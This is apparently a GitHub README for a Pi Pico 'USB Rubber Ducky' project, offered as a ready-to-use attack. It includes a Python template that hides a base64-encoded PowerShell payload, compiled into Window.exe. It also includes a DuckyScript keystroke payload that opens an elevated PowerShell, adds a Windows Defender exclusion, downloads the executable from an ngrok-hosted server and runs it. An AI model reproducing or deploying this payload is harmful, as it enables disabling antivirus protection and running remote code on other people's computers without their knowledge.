# USB Ducky

## Description

A USB Rubber Ducky is a device that looks like an ordinary USB flash drive but is actually a small computer that can very quickly execute a pre-programmed series of commands on a computer. It is usually used to execute many commands on a computer in a short time without requiring user interaction.

# You better use it at your own risk and I'm not responsible for any damage bla bla bla...

### First clone the repro.

```bash
git clone https://github.com/un9nplayer/USB-Ducky.git
cd USB-Ducky
```

 I hope you guys using this device called pi pico: https://amzn.in/d/jh3Ejsa
 
<img src="https://raw.githubusercontent.com/un9nplayer/USB-Ducky/main/img/pi%20pico.jpg" alt="img" width="500" height="500"/>

Setup your USB here check the video: [Network Chuck](https://www.youtube.com/watch?v=e_f9p-_JWZw)

## Main guide

You can create your own payloads by changing the Window.py file here: Inject your base64 data "Write-Host 'Hello, Im @Un9nplayer!!!' -ForegroundColor Red; pause"

````bash
import subprocess
import base64

u_c = "V3JpdGUtSG9zdCAnSGVsbG8sIEltIEBVbjlucGxheWVyISEhJyAtRm9yZWdyb3VuZENvbG9yIFJlZDsgcGF1c2U="
de_c = base64.b64decode(u_c).decode('utf-8')

subprocess.call(["powershell", "-Command", de_c])
````

### Convert the Window.py to Window.exe:
````bash
pip install pyinstaller
pyinstaller --onefile Window.py
````
Find the dist dir with Window.exe.


### Check Payload.dd file changes the {your-hosted-web-server} where you host the "Window.exe" file.

````
GUI r
DELAY 1000
STRING powershell 
ENTER
DELAY 1000
STRING Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& {Add-MpPreference -ExclusionPath 'C:\win'; Start-Sleep -Seconds 0;}`"" -Verb RunAs
ENTER
DELAY 1000
ALT y
DELAY 1500
STRING cd / ; mkdir win ; cd win ; echo (wget 'https://{your-hosted-web-server}/Window.exe' -OutFile Window.exe) > b.ps1 ; powershell -ExecutionPolicy ByPass -File b.ps1
ENTER
DELAY 5000
STRING Start-Process -FilePath ".\Window.exe"
ENTER

````


### Now host the Window.exe
````bash
ngrok http --domain=longhorn-discrete-flamingo.ngrok-free.app 80

On new teb

Python3 -m http.server 80 
````

Final URL: https://longhorn-discrete-flamingo.ngrok-free.app/Window.exe

## Here check the Video:

[![Watch the video](https://img.youtube.com/vi/EqfmRErQy2c/0.jpg)](https://www.youtube.com/watch?v=EqfmRErQy2c)
